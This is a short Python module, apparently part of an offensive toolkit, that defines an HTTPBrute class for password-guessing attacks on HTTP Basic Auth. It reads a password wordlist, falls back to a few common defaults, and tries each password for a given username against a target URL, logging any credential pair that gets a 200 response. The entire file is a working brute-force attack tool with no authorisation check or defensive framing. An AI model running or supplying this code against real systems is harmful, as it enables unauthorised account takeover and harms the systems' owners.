import requests
from core.colors import log_info, log_success, log_warning, log_danger

class HTTPBrute:
    def __init__(self, target, username, wordlist_file="wordlists/passwords_top10k.txt"):
        self.target = target
        self.username = username
        self.wordlist_file = wordlist_file
        self.passwords = ["admin", "123456", "password", "root", "12345678"]

    def load_words(self):
        try:
            with open(self.wordlist_file, 'r') as f:
                loaded = [line.strip() for line in f if line.strip()]
                if loaded:
                    self.passwords = loaded
        except FileNotFoundError:
            pass

    def brute_basic(self):
        self.load_words()
        log_info(f"Starting HTTP Basic Auth Brute Force on {self.target} for user '{self.username}'...")
        for pwd in self.passwords:
            try:
                response = requests.get(self.target, auth=(self.username, pwd), timeout=3)
                if response.status_code == 200:
                    log_success(f"[+] SUCCESS! Credentials found -> {self.username}:{pwd}")
                    return True
            except Exception:
                pass
        log_warning("Brute force failed. No valid passwords found.")
        return False

    def run(self):
        return self.brute_basic()
